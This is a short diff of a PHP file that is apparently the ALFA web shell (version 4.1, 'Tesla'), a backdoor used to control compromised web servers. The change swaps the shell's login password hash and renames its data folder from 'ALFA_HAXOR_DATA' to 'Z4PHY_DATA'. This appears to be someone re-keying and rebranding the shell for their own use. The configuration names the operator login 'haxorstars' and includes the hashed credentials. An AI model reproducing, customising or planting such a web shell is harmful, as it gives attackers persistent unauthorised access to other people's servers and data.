@@ -2,7 +2,7 @@
 
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'haxorstars',
-    'password' => 'ff6d9718a96dd1c0ec471cc444adaf54',
+    'password' => '190b6d402db6ce02363b983178ae9bc3',
     'safe_mode' => '1',
     'login_page' => 'nulz',
     'show_icons' => '1',
@@ -174,7 +174,7 @@ if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "Tesla");
-define("__ALFA_DATA_FOLDER__", "ALFA_HAXOR_DATA");
+define("__ALFA_DATA_FOLDER__", "Z4PHY_DATA");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
